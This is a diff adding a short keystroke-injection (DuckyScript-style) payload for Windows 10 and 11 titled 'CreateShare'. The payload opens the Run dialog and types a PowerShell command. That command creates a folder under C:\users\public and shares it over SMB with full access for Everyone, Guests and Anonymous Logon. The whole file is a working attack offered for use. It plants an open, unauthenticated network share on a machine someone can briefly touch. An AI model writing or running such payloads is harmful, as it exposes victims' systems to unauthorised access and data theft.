@@ -1,0 +1,11 @@
+REM     Title: CreateShare
+REM     Author: cbk914
+
+REM     Description: Creates a SMB shared drive
+
+REM     Target: Windows 10, 11
+
+DELAY 1000
+GUI r
+STRING powershell -c "new-item "c:\users\public\share" -itemtype directory New-SmbShare -Name "sharedir" -Path "C:\users\public\share" -FullAccess "Everyone","Guests","Anonymous Logon""
+RUN
